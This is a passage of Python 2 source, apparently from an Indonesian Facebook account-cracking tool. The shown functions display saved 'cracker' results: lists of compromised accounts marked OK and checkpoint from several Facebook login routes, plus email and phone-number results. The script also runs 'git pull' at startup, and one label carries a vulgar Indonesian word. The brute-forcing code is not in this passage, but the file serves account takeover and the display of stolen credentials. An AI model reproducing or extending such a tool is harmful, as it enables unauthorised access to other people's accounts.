    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat touchfb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat touchfb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result Api Facebook ###


def result_apei():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Api.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat apifb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat apifb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result Free Facebook ###


def result_freeefbi():
    os.system('clear')
    print logo 
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Free.Facebook\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat freefb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat freefb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result Email ###


def result_emailampas():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Email\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Email "))
    try:
        os.system("cat email/hasil.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Result Nomor ###


def result_nomoertogel():
    os.system('clear')
    print logo
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Cracker Phone Number\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m]"))
    print("\033[0;96m"+50*"-")
    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result Live/Check "))
    try:
        os.system("cat done/indo.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()

### Update Kontol ###


def up():
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m•\x1b[1;37m] Mohon Bersabar User, Script Sedang Di Update!'
    os.sys.exit()

if __name__=="__main__":
    os.system('git pull')
    menu()
